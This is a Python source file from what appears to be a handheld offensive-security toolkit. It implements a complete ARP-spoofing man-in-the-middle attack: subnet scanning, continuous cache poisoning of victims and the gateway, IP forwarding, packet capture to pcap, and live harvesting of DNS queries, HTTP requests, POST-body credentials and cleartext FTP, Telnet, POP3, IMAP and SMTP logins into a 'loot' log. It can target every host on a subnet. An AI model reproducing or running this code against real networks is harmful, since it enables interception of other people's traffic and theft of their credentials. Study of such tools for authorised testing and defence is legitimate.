"""MITM — ARP spoofing man-in-the-middle attack.

Poisons ARP caches to intercept traffic between victim(s) and the gateway.
Captures packets to pcap and shows live DNS/HTTP/credential log.
Runs entirely on the uConsole (scapy + tcpdump), does NOT use ESP32 serial.
"""

import os
import re
import socket
import struct
import subprocess
import threading
import time
from datetime import datetime

import urwid

from ...app_state import AppState
from ...loot_manager import LootManager
from ...privacy import mask_line, mask_ip, mask_mac
from ..widgets.log_viewer import LogViewer
from ..widgets.confirm_dialog import ConfirmDialog
from ..widgets.info_dialog import InfoDialog
from ..widgets.text_input_dialog import TextInputDialog


class MITMScreen(urwid.WidgetWrap):
    """Sub-screen for ARP spoofing MITM attack.

    Keys:
      [s] Start attack (interface + target selection)
      [x] Stop attack (restores ARP, disables forwarding)
    """

    def __init__(self, state: AppState, app,
                 loot: LootManager | None = None) -> None:
        self.state = state
        self._app = app
        self._loot = loot

        self._running = False
        self._spoof_thread: threading.Thread | None = None
        self._sniff_thread: threading.Thread | None = None
        self._tcpdump_proc: subprocess.Popen | None = None
        self._pcap_path = ""

        self._iface = ""
        self._gateway_ip = ""
        self._gateway_mac = ""
        self._victims: list[tuple[str, str]] = []  # [(ip, mac), ...]
        self._orig_ip_forward = "0"

        self._log = LogViewer(max_lines=300)
        self._status = urwid.Text(("dim", "  [s]Start  [esc]Back"))
        self._info = urwid.Text(("warning", "  MITM — idle"))

        self._idle_view = urwid.ListBox(urwid.SimpleFocusListWalker([
            urwid.Text(("default",
                        "  MITM — ARP Spoofing Attack\n\n"
                        "  Intercepts traffic between victim(s)\n"
                        "  and the network gateway.\n\n"
                        "  Captures: DNS queries, HTTP requests,\n"
                        "  cleartext credentials (FTP/Telnet/POP3)\n\n"
                        "  Saves full pcap to loot/mitm/\n\n"
                        "  Press [s] to start")),
        ]))
        self._body = urwid.WidgetPlaceholder(self._idle_view)

        pile = urwid.Pile([
            ("pack", self._info),
            ("pack", urwid.Divider("─")),
            self._body,
            ("pack", urwid.Divider("─")),
            ("pack", self._status),
        ])
        super().__init__(pile)

    # ------------------------------------------------------------------
    # refresh
    # ------------------------------------------------------------------

    def refresh(self) -> None:
        if self.state.mitm_running:
            pkts = self.state.mitm_packets
            victims = ", ".join(mask_ip(ip) for ip, _ in self._victims)
            self._info.set_text(
                ("attack_active",
                 f"  MITM RUNNING | {victims} ↔ {mask_ip(self._gateway_ip)} | "
                 f"Packets: {pkts}")
            )
            self._status.set_text(("dim", "  [x]Stop"))
        else:
            self._info.set_text(("warning", "  MITM — idle"))
            self._status.set_text(("dim", "  [s]Start  [esc]Back"))

    # ------------------------------------------------------------------
    # Network helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _get_interfaces() -> list[tuple[str, str]]:
        """Return [(iface, ip)] for non-loopback interfaces with an IP."""
        result: list[tuple[str, str]] = []
        try:
            import netifaces
            for iface in netifaces.interfaces():
                if iface == "lo":
                    continue
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    for a in addrs[netifaces.AF_INET]:
                        result.append((iface, a.get("addr", "")))
        except ImportError:
            # Fallback: parse ip addr
            try:
                out = subprocess.run(
                    ["ip", "-4", "-o", "addr", "show"],
                    capture_output=True, text=True, timeout=5,
                ).stdout
                for line in out.splitlines():
                    parts = line.split()
                    if len(parts) >= 4:
                        iface = parts[1]
                        ip = parts[3].split("/")[0]
                        if iface != "lo":
                            result.append((iface, ip))
            except Exception:
                pass
        return result

    @staticmethod
    def _get_default_gateway() -> str:
        """Read default gateway IP from /proc/net/route."""
        try:
            with open("/proc/net/route") as f:
                for line in f:
                    fields = line.strip().split()
                    if len(fields) < 3:
                        continue
                    if fields[1] != "00000000":
                        continue
                    if not int(fields[3], 16) & 2:
                        continue
                    packed = int(fields[2], 16)
                    return socket.inet_ntoa(struct.pack("<I", packed))
        except Exception:
            pass
        return ""

    @staticmethod
    def _get_mac(ip: str, iface: str, timeout: int = 3) -> str:
        """Resolve IP to MAC via ARP request (scapy)."""
        try:
            from scapy.all import ARP, Ether, srp
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=iface, timeout=timeout, verbose=0,
            )
            if ans:
                return ans[0][1].hwsrc
        except Exception:
            pass
        return ""

    @staticmethod
    def _get_subnet(ip: str, iface: str) -> str:
        """Get CIDR subnet for interface (e.g. 192.168.1.0/24)."""
        try:
            out = subprocess.run(
                ["ip", "-4", "-o", "addr", "show", iface],
                capture_output=True, text=True, timeout=5,
            ).stdout
            for line in out.splitlines():
                m = re.search(r'inet\s+(\S+)', line)
                if m:
                    return m.group(1)  # e.g. "192.168.1.5/24"
        except Exception:
            pass
        return f"{ip}/24"

    def _arp_scan(self, subnet: str, iface: str) -> list[tuple[str, str]]:
        """ARP scan subnet, return [(ip, mac)]."""
        hosts: list[tuple[str, str]] = []
        try:
            from scapy.all import ARP, Ether, srp
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
                iface=iface, timeout=3, verbose=0,
            )
            for sent, received in ans:
                hosts.append((received.psrc, received.hwsrc))
        except Exception as e:
            self._log.append(f"  ARP scan error: {e}", "error")
        return hosts

    # ------------------------------------------------------------------
    # IP forwarding
    # ------------------------------------------------------------------

    def _enable_ip_forward(self) -> None:
        """Enable IP forwarding, save original value."""
        try:
            with open("/proc/sys/net/ipv4/ip_forward") as f:
                self._orig_ip_forward = f.read().strip()
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            self._log.append("  IP forwarding enabled", "dim")
        except PermissionError:
            # Try via sysctl
            subprocess.run(
                ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
                capture_output=True, timeout=5,
            )
            self._log.append("  IP forwarding enabled (sysctl)", "dim")

    def _restore_ip_forward(self) -> None:
        """Restore original IP forwarding value."""
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(self._orig_ip_forward)
        except Exception:
            try:
                subprocess.run(
                    ["sudo", "sysctl", "-w",
                     f"net.ipv4.ip_forward={self._orig_ip_forward}"],
                    capture_output=True, timeout=5,
                )
            except Exception:
                pass

    # ------------------------------------------------------------------
    # ARP spoofing thread
    # ------------------------------------------------------------------

    def _spoof_loop(self) -> None:
        """Continuously poison ARP caches."""
        try:
            from scapy.all import ARP, Ether, sendp, get_if_hwaddr
        except ImportError:
            self._log.append("ERROR: scapy not installed", "error")
            self.state.mitm_running = False
            return

        our_mac = get_if_hwaddr(self._iface)
        gw_ip = self._gateway_ip
        gw_mac = self._gateway_mac

        while self._running:
            try:
                for victim_ip, victim_mac in self._victims:
                    # Tell victim: gateway is at our MAC
                    pkt_to_victim = (
                        Ether(dst=victim_mac)
                        / ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                              psrc=gw_ip)
                    )
                    # Tell gateway: victim is at our MAC
                    pkt_to_gw = (
                        Ether(dst=gw_mac)
                        / ARP(op=2, pdst=gw_ip, hwdst=gw_mac,
                              psrc=victim_ip)
                    )
                    sendp(pkt_to_victim, iface=self._iface, verbose=0)
                    sendp(pkt_to_gw, iface=self._iface, verbose=0)
                time.sleep(1)
            except Exception as e:
                self._log.append(f"  ARP spoof error: {e}", "error")
                time.sleep(2)

    def _restore_arp(self) -> None:
        """Send correct ARP mappings to restore tables."""
        try:
            from scapy.all import ARP, Ether, sendp
        except ImportError:
            return

        gw_ip = self._gateway_ip
        gw_mac = self._gateway_mac

        for victim_ip, victim_mac in self._victims:
            # Restore victim: gateway is at gateway's real MAC
            pkt_to_victim = (
                Ether(dst=victim_mac)
                / ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                      psrc=gw_ip, hwsrc=gw_mac)
            )
            # Restore gateway: victim is at victim's real MAC
            pkt_to_gw = (
                Ether(dst=gw_mac)
                / ARP(op=2, pdst=gw_ip, hwdst=gw_mac,
                      psrc=victim_ip, hwsrc=victim_mac)
            )
            sendp(pkt_to_victim, iface=self._iface, verbose=0, count=5)
            sendp(pkt_to_gw, iface=self._iface, verbose=0, count=5)

        self._log.append("  ARP tables restored", "success")

    # ------------------------------------------------------------------
    # Packet sniffer thread
    # ------------------------------------------------------------------

    def _sniff_loop(self) -> None:
        """Sniff packets and parse interesting data live."""
        try:
            from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Raw
        except ImportError:
            return

        victim_ips = {ip for ip, _ in self._victims}
        bpf = " or ".join(f"host {ip}" for ip in victim_ips)

        def process(pkt):
            if not self._running:
                return
            self.state.mitm_packets += 1

            try:
                # DNS queries
                if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
                    qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
                    src = pkt[IP].src if pkt.haslayer(IP) else "?"
                    self._log.append(
                        mask_line(f"  DNS: {src} → {qname}"), "dim")
                    return

                if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
                    return

                load = pkt[Raw].load
                dport = pkt[TCP].dport

                # HTTP requests
                if dport == 80:
                    try:
                        text = load.decode(errors="ignore")
                        lines = text.split("\r\n")
                        if lines and lines[0].startswith(("GET ", "POST ", "PUT ")):
                            method_path = lines[0].split(" HTTP")[0]
                            host = ""
                            for hdr in lines[1:]:
                                if hdr.lower().startswith("host:"):
                                    host = hdr.split(":", 1)[1].strip()
                                    break
                            url = f"{host}{method_path.split(' ', 1)[1]}" if host else method_path
                            self._log.append(
                                mask_line(f"  HTTP: {method_path.split()[0]} {url}"), "default")

                            # Check for credentials in POST body
                            if method_path.startswith("POST"):
                                body_start = text.find("\r\n\r\n")
                                if body_start > 0:
                                    body = text[body_start + 4:]
                                    cred_kw = ("user", "pass", "login", "email",
                                               "pwd", "auth", "token", "secret")
                                    if any(k in body.lower() for k in cred_kw):
                                        self._log.append(
                                            mask_line(f"  CREDS: {body[:200]}"),
                                            "attack_active",
                                        )
                                        if self._loot:
                                            self._loot.log_attack_event(
                                                f"MITM_CREDS: {body[:500]}"
                                            )
                    except Exception:
                        pass
                    return

                # Cleartext protocols (FTP, Telnet, POP3, IMAP, SMTP)
                if dport in (21, 23, 25, 110, 143):
                    proto_map = {21: "FTP", 23: "Telnet", 25: "SMTP",
                                 110: "POP3", 143: "IMAP"}
                    proto = proto_map.get(dport, str(dport))
                    try:
                        text = load.decode(errors="ignore").strip()
                        auth_kw = ("USER", "PASS", "LOGIN", "AUTH")
                        if any(text.upper().startswith(k) for k in auth_kw):
                            self._log.append(
                                mask_line(f"  AUTH [{proto}]: {text[:150]}"),
                                "warning",
                            )
                            if self._loot:
                                self._loot.log_attack_event(
                                    f"MITM_AUTH [{proto}]: {text[:300]}"
                                )
                    except Exception:
                        pass

            except Exception:
                pass

        try:
            sniff(
                iface=self._iface, prn=process, store=0,
                filter=bpf,
                stop_filter=lambda _: not self._running,
            )
        except Exception as e:
            if self._running:
                self._log.append(f"  Sniffer error: {e}", "error")

    # ------------------------------------------------------------------
    # tcpdump capture
    # ------------------------------------------------------------------

    def _start_tcpdump(self) -> None:
        """Start tcpdump to save full pcap."""
        if not self._loot:
            return
        mitm_dir = os.path.join(self._loot.session_dir, "mitm")
        os.makedirs(mitm_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self._pcap_path = os.path.join(mitm_dir, f"capture_{ts}.pcap")

        victim_filter = " or ".join(f"host {ip}" for ip, _ in self._victims)
        try:
            self._tcpdump_proc = subprocess.Popen(
                ["tcpdump", "-i", self._iface, "-w", self._pcap_path,
                 "-s", "0", victim_filter],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            self._log.append(f"  tcpdump → {self._pcap_path}", "dim")
        except FileNotFoundError:
            self._log.append("  tcpdump not found — no pcap capture", "warning")
            self._tcpdump_proc = None

    def _stop_tcpdump(self) -> None:
        if self._tcpdump_proc:
            try:
                self._tcpdump_proc.terminate()
                self._tcpdump_proc.wait(timeout=5)
            except Exception:
                try:
                    self._tcpdump_proc.kill()
                except Exception:
                    pass
            self._tcpdump_proc = None

    # ------------------------------------------------------------------
    # Start wizard
    # ------------------------------------------------------------------

    def _start(self) -> None:
        if self.state.mitm_running:
            return

        ifaces = self._get_interfaces()
        if not ifaces:
            self._wait_for_interface()
            return

        self._select_interface(ifaces)

    def _wait_for_interface(self) -> None:
        """Show waiting dialog that polls for network interfaces."""
        self._iface_check_alarm = None
        self._iface_waiting = True

        def check_iface(loop=None, _data=None):
            if not self._iface_waiting:
                return
            ifaces = self._get_interfaces()
            if ifaces:
                self._iface_waiting = False
                self._app.dismiss_overlay()
                self._select_interface(ifaces)
                return
            if hasattr(self._app, '_loop') and self._app._loop:
                self._iface_check_alarm = self._app._loop.set_alarm_in(
                    2, check_iface
                )

        msg = (
            "No network interface with IP found.\n\n"
            "Plug in your WiFi adapter\n"
            "(e.g. Alfa) and connect to\n"
            "the target network.\n\n"
            "Auto-detecting interfaces..."
        )

        def on_dismiss():
            self._iface_waiting = False
            if self._iface_check_alarm and hasattr(self._app, '_loop'):
                try:
                    self._app._loop.remove_alarm(self._iface_check_alarm)
                except Exception:
                    pass
            self._app.dismiss_overlay()

        dialog = InfoDialog(msg, on_dismiss, title="MITM")
        self._app.show_overlay(dialog, 50, 11)

        if hasattr(self._app, '_loop') and self._app._loop:
            self._iface_check_alarm = self._app._loop.set_alarm_in(
                2, check_iface
            )

    def _select_interface(self, ifaces: list[tuple[str, str]]) -> None:
        """Pick interface from list or auto-select if only one."""
        if len(ifaces) == 1:
            self._iface = ifaces[0][0]
            self._pick_target_mode()
        else:
            from ..widgets.file_picker import FilePicker
            labels = [f"{iface} ({ip})" for iface, ip in ifaces]

            def on_pick(idx, name):
                self._app.dismiss_overlay()
                if idx < 0:
                    return
                self._iface = ifaces[idx][0]
                self._pick_target_mode()

            picker = FilePicker(labels, on_pick, title="Select interface:")
            self._app.show_overlay(picker, 45, min(len(labels) + 6, 14))

    def _pick_target_mode(self) -> None:
        """Show target mode selection."""
        from ..widgets.file_picker import FilePicker
        modes = [
            "Single target (enter IP)",
            "Scan subnet + select",
            "All devices on subnet",
        ]

        def on_pick(idx, name):
            self._app.dismiss_overlay()
            if idx < 0:
                return
            if idx == 0:
                self._enter_single_target()
            elif idx == 1:
                self._scan_and_select()
            elif idx == 2:
                self._target_all()

        picker = FilePicker(modes, on_pick, title="Target mode:")
        self._app.show_overlay(picker, 45, 9)

    def _enter_single_target(self) -> None:
        """Ask for single victim IP."""
        def on_input(ip) -> None:
            self._app.dismiss_overlay()
            if ip is None:
                return  # Esc pressed
            ip = ip.strip()
            if not re.match(r'^\d{1,3}(\.\d{1,3}){3}$', ip):
                self._status.set_text(("error", "  Invalid IP address"))
                return
            mac = self._get_mac(ip, self._iface)
            if not mac:
                self._status.set_text(("error", f"  Could not resolve MAC for {ip}"))
                return
            self._victims = [(ip, mac)]
            self._resolve_gateway_and_confirm()

        dialog = TextInputDialog("Victim IP address", on_input)
        self._app.show_overlay(dialog, 45, 7)

    def _scan_and_select(self) -> None:
        """ARP scan subnet and let user pick target."""
        self._log.clear()
        self._body.original_widget = self._log
        self._log.append(">>> Scanning subnet...", "warning")

        def do_scan():
            subnet = self._get_subnet("", self._iface)
            hosts = self._arp_scan(subnet, self._iface)
            gw = self._get_default_gateway()
            # Filter out gateway and ourselves
            my_ips = {ip for _, ip in self._get_interfaces()}
            filtered = [(ip, mac) for ip, mac in hosts
                        if ip != gw and ip not in my_ips]

            if not filtered:
                self._log.append("  No hosts found on subnet", "error")
                return

            # Show found hosts in log
            for ip, mac in filtered:
                self._log.append(f"  {mask_ip(ip)}  ({mask_mac(mac)})", "default")
            self._log.append(
                f"\n  Found {len(filtered)} hosts. Enter target IP:", "success"
            )

            # Ask for IP from the list
            self._scan_results = filtered

            def on_input(ip) -> None:
                self._app.dismiss_overlay()
                if ip is None:
                    return  # Esc pressed
                ip = ip.strip()
                match = [(h_ip, h_mac) for h_ip, h_mac in self._scan_results
                         if h_ip == ip]
                if not match:
                    # Try to resolve directly
                    mac = self._get_mac(ip, self._iface)
                    if not mac:
                        self._status.set_text(("error", f"  {ip} not found"))
                        return
                    match = [(ip, mac)]
                self._victims = match
                self._resolve_gateway_and_confirm()

            dialog = TextInputDialog("Target IP", on_input)
            self._app.show_overlay(dialog, 40, 7)

        threading.Thread(target=do_scan, daemon=True).start()

    def _target_all(self) -> None:
        """ARP scan and target all discovered hosts."""
        self._log.clear()
        self._body.original_widget = self._log
        self._log.append(">>> Scanning all hosts on subnet...", "warning")

        def do_scan():
            subnet = self._get_subnet("", self._iface)
            hosts = self._arp_scan(subnet, self._iface)
            gw = self._get_default_gateway()
            my_ips = {ip for _, ip in self._get_interfaces()}
            filtered = [(ip, mac) for ip, mac in hosts
                        if ip != gw and ip not in my_ips]

            if not filtered:
                self._log.append("  No hosts found on subnet", "error")
                return

            for ip, mac in filtered:
                self._log.append(f"  {mask_ip(ip)}  ({mask_mac(mac)})", "default")

            self._victims = filtered
            self._log.append(
                f"\n  Targeting {len(filtered)} hosts", "attack_active"
            )
            self._resolve_gateway_and_confirm()

        threading.Thread(target=do_scan, daemon=True).start()

    def _resolve_gateway_and_confirm(self) -> None:
        """Resolve gateway and show final confirmation."""
        self._gateway_ip = self._get_default_gateway()
        if not self._gateway_ip:
            self._log.append("  ERROR: Could not detect gateway", "error")
            return

        self._gateway_mac = self._get_mac(self._gateway_ip, self._iface)
        if not self._gateway_mac:
            self._log.append(
                f"  ERROR: Could not resolve gateway MAC ({mask_ip(self._gateway_ip)})",
                "error",
            )
            return

        victims_str = ", ".join(mask_ip(ip) for ip, _ in self._victims)
        if len(self._victims) > 3:
            victims_str = f"{len(self._victims)} hosts"

        def on_confirm(yes: bool) -> None:
            self._app.dismiss_overlay()
            if not yes:
                return
            self._do_start()

        dialog = ConfirmDialog(
            f"Start MITM attack?\n"
            f"Victims: {victims_str}\n"
            f"Gateway: {mask_ip(self._gateway_ip)}\n"
            f"Interface: {self._iface}",
            on_confirm,
        )
        self._app.show_overlay(dialog, 55, 10)

    # ------------------------------------------------------------------
    # Start / stop
    # ------------------------------------------------------------------

    def _do_start(self) -> None:
        self._running = True
        self.state.mitm_running = True
        self.state.mitm_packets = 0
        self._log.clear()
        self._body.original_widget = self._log

        victims_str = ", ".join(mask_ip(ip) for ip, _ in self._victims)
        self._log.append(
            f">>> MITM: {victims_str} ↔ {mask_ip(self._gateway_ip)} via {self._iface}",
            "attack_active",
        )

        # Enable IP forwarding
        self._enable_ip_forward()

        # Start tcpdump
        self._start_tcpdump()

        # Start ARP spoofing thread
        self._spoof_thread = threading.Thread(
            target=self._spoof_loop, daemon=True
        )
        self._spoof_thread.start()
        self._log.append("  ARP spoofing started", "success")

        # Start sniffer thread
        self._sniff_thread = threading.Thread(
            target=self._sniff_loop, daemon=True
        )
        self._sniff_thread.start()
        self._log.append("  Packet sniffer started", "success")

        if self._loot:
            self._loot.log_attack_event(
                f"STARTED: MITM ({victims_str} ↔ {self._gateway_ip})"
            )

    def _stop(self) -> None:
        if not self._running:
            return
        self._running = False
        self._log.append(">>> Stopping MITM...", "warning")

        # Restore ARP tables
        self._restore_arp()

        # Stop tcpdump
        self._stop_tcpdump()

        # Restore IP forwarding
        self._restore_ip_forward()
        self._log.append("  IP forwarding restored", "dim")

        # Wait for threads
        if self._spoof_thread:
            self._spoof_thread.join(timeout=3)
            self._spoof_thread = None
        if self._sniff_thread:
            self._sniff_thread.join(timeout=3)
            self._sniff_thread = None

        self.state.mitm_running = False

        if self._pcap_path and os.path.exists(self._pcap_path):
            size = os.path.getsize(self._pcap_path)
            self._log.append(
                f"  Pcap saved: {self._pcap_path} ({size} bytes)", "success"
            )

        self._log.append(
            f">>> MITM stopped. Packets: {self.state.mitm_packets}", "warning"
        )

        if self._loot:
            self._loot.log_attack_event(
                f"STOPPED: MITM (packets: {self.state.mitm_packets})"
            )

    # ------------------------------------------------------------------
    # Keypress
    # ------------------------------------------------------------------

    def keypress(self, size, key):
        if key == "s" and not self.state.mitm_running:
            self._start()
            return None
        if key == "x":
            self._stop()
            return None
        return super().keypress(size, key)
